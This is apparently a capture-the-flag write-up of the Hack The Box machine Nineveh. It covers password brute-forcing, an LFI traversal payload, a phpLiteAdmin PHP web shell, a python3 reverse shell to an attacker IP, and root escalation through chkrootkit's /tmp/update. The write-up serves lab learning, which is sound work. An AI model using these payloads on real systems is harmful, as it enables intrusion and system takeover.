---
title: Hack The Box - Nineveh (Without Metasploit)
date: 2021-01-14 14:38:00 +0800
categories: [hackthebox]
tags: [linux, phpliteadmin, lfi, chkrootkit]
image:
    path: /assets/images/nineveh.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.43 nineveh.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.

```bash 
$ which resolve 
resolve () {
        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
}

$ which superscan
superscan () {
        name="$(resolve $1)" 
        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
}

$ superscan nineveh.htb       
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.43:80
Open 10.10.10.43:443
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 03:41 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:41
Completed NSE at 03:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:41
Completed NSE at 03:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:41
Completed NSE at 03:41, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:41
Completed Parallel DNS resolution of 1 host. at 03:41, 0.20s elapsed
DNS resolution of 1 IPs took 0.20s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 03:41
Scanning 10.10.10.43 [2 ports]
Discovered open port 80/tcp on 10.10.10.43
Discovered open port 443/tcp on 10.10.10.43
Completed Connect Scan at 03:41, 0.01s elapsed (2 total ports)
Initiating Service scan at 03:41
Scanning 2 services on 10.10.10.43
Completed Service scan at 03:42, 12.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.43.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 1.59s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.14s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Nmap scan report for 10.10.10.43
Host is up, received user-set (0.0063s latency).
Scanned at 2021-01-14 03:41:49 UTC for 14s

PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
| SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
| -----BEGIN CERTIFICATE-----
| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
| KrYQgX28Ulf8OSGJuA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
```

# Enumeration (1) 

## Port 80 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/nineveh1.png)

Nothing much here... This called for some directory bruteforcing!

```bash
$ gobuster dir -k -u http://nineveh.htb/ -w /usr/share/wordlists/dirb/big.txt -t 20 -x .html,.php,.txt.xml   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://nineveh.htb/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt.xml
[+] Timeout:        10s
===============================================================
2021/01/13 04:40:02 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt.xml (Status: 403)
/.htaccess.txt.xml (Status: 403)
/department (Status: 301)
/index.html (Status: 200)
/info.php (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/13 04:40:39 Finished
===============================================================
```

We see that there is a `/department` folder! Lets navigate to it.

![](/assets/images/nineveh2.png)

We are presented with a login page. If we check the `HTML` source, we see a comment left by `amrois`.

![](/assets/images/nineveh3.png)

We know that there is a user called `admin`. If we attempt to login with username as `admin` we get `Invalid Password!`. However if we use any other username, it will return `Invalid username`. This shows that the username must be `admin`. Since we didn't know the password, we could attempt to brute-force with `rockyou.txt`.

```bash
$ ffuf  -w /usr/share/wordlists/rockyou.txt -u http://nineveh.htb/department/login.php -X POST -d "username=admin&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded" -t 100        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://nineveh.htb/department/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Regexp: Invalid Password
________________________________________________

1q2w3e4r5t              [Status: 302, Size: 2306, Words: 506, Lines: 66]
```

The password is `1q2w3e4r5t`. After logging in with it, we are presented with this page.

![](/assets/images/nineveh4.png)

Under `Notes`, it seems that `amrois` has left us another message.

![](/assets/images/nineveh5.png)

However, if you look at the URL, you will see that there is a parameter called `notes` and had a value of a relative path to a file called `ninevehNotes.txt`.

![](/assets/images/nineveh6.png)

This already smells like `Local File Inclusion`, so lets try out different payloads and attempt to include a known file: `/etc/passwd`.

After many trials, I noticed that it seems to be checking if `/ninevehNotes` is in the string that we submit. Without `/ninevehNotes`, it will refuse to process our input and simply throw us `No Note is selected`. 

Then the next step would be to try `notes=/ninevehNotes/../../../../../etc/passwd`, which actually returns the content of `/etc/passwd`!

![](/assets/images/nineveh7.png)

If we remove some of the `../` from our input, we realise that the minimum payload we need to get `/etc/passwd` is actually `notes=/ninevehNotes/../etc/passwd`.

Now that we have the ability to include any file on the system, we just need to figure out which file to include. Unfortunately, we are not able to use `PHP` wrappers to read file content as the page will complain that the `File name is too long`.

## Port 443 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/nineveh8.png)

Aside from this picture, there was nothing else. Hence the same strategy of directory bruteforcing applies here.

```bash
$ gobuster dir -k -u https://nineveh.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x .html,.php,.txt.xml 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://nineveh.htb/
[+] Threads:        5
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt.xml
[+] Timeout:        10s
===============================================================
2021/01/13 04:14:18 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.hta.txt.xml (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt.xml (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt.xml (Status: 403)
/db (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/13 04:14:44 Finished
===============================================================
```

We see that there is a `/db` folder! Lets navigate to it.

![](/assets/images/nineveh9.png)

We see that the version of `phpliteAdmin.php` that is installed is `1.9`. I tried the default password `admin` but it didn't work. Lets try bruteforcing the password like before.

```bash
$ ffuf  -w /usr/share/wordlists/rockyou.txt -u https://nineveh.htb/db/index.php -X POST -d "password=FUZZ&remember=yes&login=Log+In&proc_login=true" -fr "Incorrect password." -H "Content-Type: application/x-www-form-urlencoded" -t 100           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : https://nineveh.htb/db/index.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : password=FUZZ&remember=yes&login=Log+In&proc_login=true
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Regexp: Incorrect password.
________________________________________________

password123             [Status: 200, Size: 14088, Words: 658, Lines: 486
```

Using the password `password123`, we are able to login!

![](/assets/images/nineveh10.png)

Using `searchsploit`, we see that this version of `phpliteAdmin` is exploitable!

```bash
$ searchsploit phpliteAdmin 1.9
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection   | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities    | php/webapps/39714.txt
------------------------------------------------- ---------------------------------
```

# Exploitation (1)

Following from `PHPLiteAdmin 1.9.3 - Remote PHP Code Injection` exploit, we create a database with the name `hack.php`.

![](/assets/images/nineveh11.png)

After that, if you see the properties of the `hack.php` database, you will realise the database is stored as the file `/var/tmp/hack.php`!

![](/assets/images/nineveh12.png)

Next we will create a table with any name and set it to have 1 column.

![](/assets/images/nineveh13.png)

Name the column anything but set the `Type` to `TEXT` and set the `Default Value` to `<?php system($_REQUEST["cmd"]) ?>`.

![](/assets/images/nineveh14.png)

Since we know that our database is stored as a file called `/var/tmp/hack.php` and contains `<?php system($_REQUEST["cmd"]) ?>` somewhere in its contents, what happens if we use the `LFI` vulnerability and include the database ? If we visit `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&cmd=id`, we will see that our `id` command was executed!

![](/assets/images/nineveh15.png)

Since we can execute any commands, we can just start a `python3` reverse shell by visiting `http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&cmd=python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

We will then receive a connection on our `nc` listener that we setup beforehand.

```bash
$ rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.43] 54210
www-data@nineveh:/var/www/html/department$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Enumeration (2)

In the root directory there was a folder called `/report`. We see some text files with names that end with timestamp and these timestamps happen to be very recent. This is clear evidence there might be an automated task being executed here at every minute.

```bash
www-data@nineveh:/var/www/html/department$  ls -al /report
total 24
drwxr-xr-x  2 amrois amrois 4096 Jan 14 00:01 .
drwxr-xr-x 24 root   root   4096 Jul  2  2017 ..
-rw-r--r--  1 amrois amrois 4807 Jan 14 00:00 report-21-01-14:00:00.txt
-rw-r--r--  1 amrois amrois 4807 Jan 14 00:01 report-21-01-14:00:01.txt
```

To monitor for new processes, we can use `pspy`. After uploading it from our attacker machine via `HTTP` and running it, we see some interesting commands being executed as `root`.
```
www-data@nineveh:/var/www/html/department$ /tmp/pspy64
...
2021/01/14 00:17:03 CMD: UID=0    PID=24892  | /bin/sh /usr/bin/chkrootkit 
2021/01/14 00:17:03 CMD: UID=0    PID=24898  | /bin/bash /root/vulnScan.sh 
...
```

If we check `searchsploit`, `chkrootkit` version `0.49` will allow us to perform privilege escalation if exploited!

```bash
$ searchsploit chkrootkit
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)  | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation          | linux/local/33899.txt
------------------------------------------------------ ---------------------------------
```

# Exploitation (2)

According to the exploit `Chkrootkit 0.49 - Local Privilege Escalation`, we just need to create a file called `/tmp/update` and make sure it is executable. During the next run of `chkrootkit`, this `/tmp/update` will be executed with `root` privileges. I am going to make the `/tmp/update` create a `SUID` bash executable when executed instead of spawning another reverse shell.

```bash
echo "cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod +s /tmp/rootbash" > /tmp/update && chmod +x /tmp/update
```

After 1 minute, we will see a `SUID` bash executable!

```bash
./rootbash -p 
rootbash-4.3#  id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

# user.txt

The user flag is in the home directory of `amrois`.

```bash
rootbash-4.3# cat /home/amrois/user.txt
a547XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# root.txt

The root flag is in the home directory of `root`, as usual.

```bash
rootbash-4.3# cat /root/root.txt
8a89XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !